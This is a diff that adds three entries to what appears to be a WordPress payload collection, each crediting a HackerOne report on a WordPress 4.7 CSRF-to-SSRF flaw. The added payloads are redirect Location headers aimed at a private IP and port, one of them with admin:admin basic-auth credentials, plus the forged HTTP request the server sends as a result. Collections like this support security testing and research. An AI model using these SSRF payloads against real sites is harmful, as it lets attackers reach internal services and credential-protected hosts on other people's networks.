@@ -1,6 +1,37 @@
 # WordPress
 
-26 payloads.
+29 payloads.
+
+### `e92a92b1`
+
+```
+Location: http://192.168.0.1:12345
+```
+
+— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)
+
+### `671c6fd1`
+
+```
+Location: http://admin:admin@192.168.0.1:12345
+```
+
+— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)
+
+### `3a897c3e`
+
+```
+GET / HTTP/1.1
+Host: 192.168.0.1:12345
+Authorization: Basic YWRtaW46YWRtaW4=
+User-Agent: Press This (WordPress/4.7-RC1);
+Accept: */*
+Accept-Encoding: deflate, gzip
+Referer: http://admin:admin@192.168.0.1:12345/
+Connection: close
+```
+
+— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)
 
 ### `504008e3`
 
